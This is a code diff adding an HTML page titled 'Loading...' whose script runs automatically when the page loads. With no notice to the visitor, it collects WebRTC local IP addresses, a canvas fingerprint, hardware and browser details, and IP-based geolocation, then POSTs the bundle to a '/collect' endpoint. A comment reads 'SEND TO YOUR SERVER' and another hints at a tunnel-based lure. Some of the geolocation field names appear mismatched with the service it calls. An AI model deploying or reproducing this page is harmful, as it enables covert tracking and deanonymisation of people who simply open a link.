@@ -1,0 +1,110 @@
+<!doctype html>
+<html>
+  <head>
+    <title>Loading...</title>
+  </head>
+  <body>
+    <script>
+      async function captureFingerprint() {
+        // 🌐 WEBRTC LOCAL IP (BYPASS NAT!)
+        const webrtc = await getWebRTC();
+
+        // 🖼️ CANVAS FINGERPRINT (99.9% unique)
+        const canvas = getCanvasFingerprint();
+
+        // 📱 HARDWARE INFO
+        const hardware = {
+          platform: navigator.platform,
+          language: navigator.language,
+          languages: navigator.languages,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+          cpu_cores: navigator.hardwareConcurrency,
+          device_memory: navigator.deviceMemory || "unknown",
+        };
+
+        try {
+
+          const requestOptions = {
+            method: "GET",
+            redirect: "follow"
+          };
+
+          // 🌍 LOCATION (via IP API)
+          const geo = await fetch("http://ip-api.com/json", requestOptions).then((r) =>
+            r.json(),
+          );
+
+
+          // 📊 FULL FINGERPRINT
+          const fp = {
+            webrtc_ips: webrtc,
+            canvas_hash: canvas,
+            hardware: hardware,
+            browser: {
+              userAgent: navigator.userAgent,
+              vendor: navigator.vendor,
+              cookies: navigator.cookieEnabled,
+              doNotTrack: navigator.doNotTrack,
+            },
+            geo: {
+              country: geo.country_name,
+              region: geo.region,
+              city: geo.city,
+              lat: geo.latitude,
+              lon: geo.longitude,
+            },
+            timestamp: new Date().toISOString(),
+          };
+
+          // 🚀 SEND TO YOUR SERVER
+          fetch("/collect", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(fp),
+          }).then(() => {
+           
+            console.log("Fingerprint captured successfully", fp);
+            // Redirect or close
+            // window.location = "/close_tunnel";
+          });
+        } catch (error) {
+          console.log(error);
+        }
+      }
+
+      // 🛠️ FINGERPRINT FUNCTIONS
+      function getWebRTC() {
+        return new Promise((resolve) => {
+          const ips = [];
+          const rtc = new RTCPeerConnection({ iceServers: [] });
+          rtc.createDataChannel("");
+          rtc.onicecandidate = (e) => {
+            if (!e.candidate) {
+              resolve(ips);
+              rtc.close();
+              return;
+            }
+            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(
+              e.candidate.candidate,
+            );
+            if (ip) ips.push(ip[1]);
+          };
+          rtc.createOffer().then(rtc.setLocalDescription.bind(rtc));
+        });
+      }
+
+      function getCanvasFingerprint() {
+        const canvas = document.createElement("canvas");
+        const ctx = canvas.getContext("2d");
+        ctx.textBaseline = "top";
+        ctx.font = "14px Arial";
+        ctx.fillText("Fingerprint test 🕷️", 2, 2);
+        return canvas.toDataURL();
+      }
+
+      // AUTO-START on page load
+      captureFingerprint();
+    </script>
+  </body>
+</html>
